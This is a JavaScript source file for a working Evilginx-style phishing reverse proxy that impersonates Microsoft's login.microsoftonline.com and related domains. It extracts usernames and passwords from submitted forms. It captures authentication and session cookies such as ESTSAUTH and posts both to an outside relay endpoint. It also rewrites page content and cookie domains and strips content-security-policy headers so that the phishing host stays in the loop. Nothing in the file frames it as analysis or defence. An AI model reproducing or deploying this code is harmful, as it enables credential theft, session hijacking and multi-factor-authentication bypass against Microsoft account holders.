export const runtime = 'edge';

// ==================== CONFIG ====================
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Extended domain mapping (phishing domain -> original domain)
const DOMAIN_MAP = {
  [UPSTREAM]: UPSTREAM,
  'login.live.com': 'login.live.com',
  'account.live.com': 'account.live.com',
  'account.microsoft.com': 'account.microsoft.com',
  'outlook.live.com': 'outlook.live.com',
  'outlook.office.com': 'outlook.office.com',
  'www.office.com': 'www.office.com',
  'office.com': 'office.com',
  'aadcdn.msauth.net': 'aadcdn.msauth.net',
  'login.microsoft.com': 'login.microsoft.com'
};

// Auth cookies to capture (from your Go config)
const AUTH_COOKIES = [
  'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 
  'esctx', 'brcap', 'ESTSSC', 'ESTSAUTHLIGHT',
  'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice'
];
// ===============================================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, url) {
  try {
    const content = `IP: ${ip}\nURL: ${url}\nData:\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    formData.append("url", url);

    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function shouldCaptureCookie(cookieName) {
  const lowerName = cookieName.toLowerCase();
  return AUTH_COOKIES.some(auth => lowerName.includes(auth.toLowerCase())) ||
         lowerName.includes('auth') || 
         lowerName.includes('session') ||
         lowerName.includes('token');
}

async function handleProxy(request) {
  const url = new URL(request.url);
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  const url_hostname = url.hostname;
  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.hostname = UPSTREAM;
  upstreamUrl.port = '';

  if (upstreamUrl.pathname === '/' || upstreamUrl.pathname === '') {
    upstreamUrl.pathname = UPSTREAM_PATH;
  } else {
    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
  }

  console.log('Proxying to:', upstreamUrl.toString());

  const method = request.method;
  const new_request_headers = new Headers(request.headers);
  new_request_headers.delete('Host');
  new_request_headers.set('Referer', `https://${UPSTREAM}`);
  new_request_headers.set('Origin', `https://${UPSTREAM}`);

  // Enhanced Credential harvesting - supports multiple field names
  if (method === 'POST') {
    try {
      const temp_req = request.clone();
      const contentType = temp_req.headers.get('content-type') || '';
      let bodyData = {};
      
      if (contentType.includes('application/json')) {
        bodyData = await temp_req.json();
      } else {
        const body = await temp_req.text();
        const params = new URLSearchParams(body);
        params.forEach((value, key) => { bodyData[key] = value; });
      }

      // Check for credentials using patterns from Go config
      const usernameKeys = ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt'];
      const passwordKeys = ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD'];
      
      let credentials = { ip: ipAddress, url: request.url, type: 'creds' };
      let foundCreds = false;

      for (const key of Object.keys(bodyData)) {
        const lowerKey = key.toLowerCase();
        if (usernameKeys.some(k => lowerKey.includes(k.toLowerCase()))) {
          credentials.user = bodyData[key];
          foundCreds = true;
        }
        if (passwordKeys.some(k => lowerKey.includes(k.toLowerCase()))) {
          credentials.pass = bodyData[key];
          foundCreds = true;
        }
      }

      if (foundCreds) {
        await sendToVercel('credentials', credentials);
      }
    } catch (error) {
      console.error('Credential parsing error:', error.message);
    }
  }

  try {
    const fetchOptions = { method, headers: new_request_headers };
    if (!["GET", "HEAD"].includes(method)) {
      fetchOptions.body = request.body;
      fetchOptions.duplex = 'half';
    }

    let original_response = await fetch(upstreamUrl.toString(), fetchOptions);

    if (original_response.headers.get("Upgrade")?.toLowerCase() === "websocket") {
      return original_response;
    }

    const original_response_clone = original_response.clone();
    const new_response_headers = new Headers(original_response.headers);
    const status = original_response.status;

    new_response_headers.set('access-control-allow-origin', '*');
    new_response_headers.set('access-control-allow-credentials', 'true');
    new_response_headers.delete('content-security-policy');
    new_response_headers.delete('content-security-policy-report-only');
    new_response_headers.delete('clear-site-data');

    // Extract all cookies
    let allCookies = [];
    let cookieString = "";
    
    try {
      const setCookieHeader = original_response.headers.get('Set-Cookie');
      if (setCookieHeader) {
        // Handle multiple Set-Cookie headers
        const cookieParts = setCookieHeader.split(/,(?=[^;]*=)/);
        allCookies = cookieParts;
        cookieString = cookieParts.join('; ');
        
        // Rewrite domain in cookies and set them
        cookieParts.forEach(cookie => {
          let modifiedCookie = cookie;
          // Replace domains in cookie
          Object.keys(DOMAIN_MAP).forEach(origDomain => {
            modifiedCookie = modifiedCookie.replace(
              new RegExp(`Domain=${origDomain}`, 'gi'), 
              `Domain=${url_hostname}`
            );
            modifiedCookie = modifiedCookie.replace(
              new RegExp(origDomain, 'g'), 
              url_hostname
            );
          });
          new_response_headers.append('Set-Cookie', modifiedCookie);
        });
      }
    } catch (error) {
      console.error('Cookie processing error:', error);
    }

    // Check for auth cookies and exfiltrate
    const hasAuthCookie = AUTH_COOKIES.some(auth => 
      cookieString.toLowerCase().includes(auth.toLowerCase())
    );
    
    if (hasAuthCookie || allCookies.length > 0) {
      await exfiltrateCookies(cookieString, ipAddress, request.url);
    }

    const content_type = new_response_headers.get('content-type');
    let original_text;

    if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript|application\/x-javascript)/i.test(content_type)) {
      let text = await original_response_clone.text();

      // ============================================
      // COMPREHENSIVE URL REWRITING (Evilginx-style)
      // ============================================

      // 1. Fix localhost references FIRST
      text = text.replace(/https?:\/\/localhost(:\d+)?/g, `https://${url_hostname}`);
      text = text.replace(/\/\/localhost(:\d+)?/g, `//${url_hostname}`);

      // 2. Replace all mapped domains - both with and without protocol
      Object.keys(DOMAIN_MAP).forEach(domain => {
        // With https://
        text = text.replace(
          new RegExp(`https://${domain.replace(/\./g, '\\.')}`, 'g'), 
          `https://${url_hostname}`
        );
        // With http://
        text = text.replace(
          new RegExp(`http://${domain.replace(/\./g, '\\.')}`, 'g'), 
          `https://${url_hostname}`
        );
        // Protocol-relative
        text = text.replace(
          new RegExp(`//${domain.replace(/\./g, '\\.')}(?!\\w)`, 'g'), 
          `//${url_hostname}`
        );
      });

      // 3. Specific endpoint handling (GetCredentialType, Me.htm, etc.)
      // Handle root-relative paths
      text = text.replace(/(["'`])\s*\/(Me\.htm|Prefetch\.aspx|GetCredentialType)\b/g, `$1https://${url_hostname}/$2`);
      text = text.replace(/(["'`])\s*\/common\/(GetCredentialType|etc|ests)\b/g, `$1https://${url_hostname}/common/$2`);
      
      // Handle relative paths without leading slash in JS string concatenation
      text = text.replace(/\+\s*["'`]\/(Me\.htm|Prefetch\.aspx|common\/)/g, `+ "https://${url_hostname}/$1`);
      
      // Handle template literals
      text = text.replace(/\$\{\s*["'`]\/(Me\.htm|Prefetch\.aspx|common\/)/g, `\${"https://${url_hostname}/$1`);

      // 4. Fix window.location, self.location references
      text = text.replace(/window\.location\.hostname\s*=\s*["'][^"']*["']/g, `window.location.hostname = "${url_hostname}"`);
      text = text.replace(/window\.location\.host\s*=\s*["'][^"']*["']/g, `window.location.host = "${url_hostname}"`);

      // 5. Broad safety net for API endpoints (.aspx, .asmx, .ashx)
      // Replace any remaining references to upstream domains in paths
      text = text.replace(
        new RegExp(`(["'"]\\s*)(https?:)?//${UPSTREAM.replace(/\./g, '\\.')}`, 'g'), 
        `$1https://${url_hostname}`
      );

      // 6. Fix fetch/xhr URLs that might be constructed dynamically
      text = text.replace(/new\s+URL\s*\(\s*["']\/([^"']+)["']\s*\)/g, `new URL("https://${url_hostname}/$1")`);
      
      // 7. Replace any remaining exact domain matches (for hardcoded strings)
      Object.keys(DOMAIN_MAP).forEach(domain => {
        text = text.split(domain).join(url_hostname);
      });

      original_text = text;
    } else {
      original_text = original_response_clone.body;
    }

    return new Response(original_text, {
      status,
      headers: new_response_headers
    });

  } catch (fetchError) {
    console.error('Upstream fetch failed:', {
      url: upstreamUrl.toString(),
      error: fetchError.message
    });

    return new Response(
      JSON.stringify({ error: "Proxy Error", message: "Failed to reach upstream" }),
      { status: 502, headers: { 'content-type': 'application/json' } }
    );
  }
}

export const GET = handleProxy;
export const POST = handleProxy;
export const PUT = handleProxy;
export const DELETE = handleProxy;
export const PATCH = handleProxy;
export const OPTIONS = handleProxy;
export const HEAD = handleProxy;
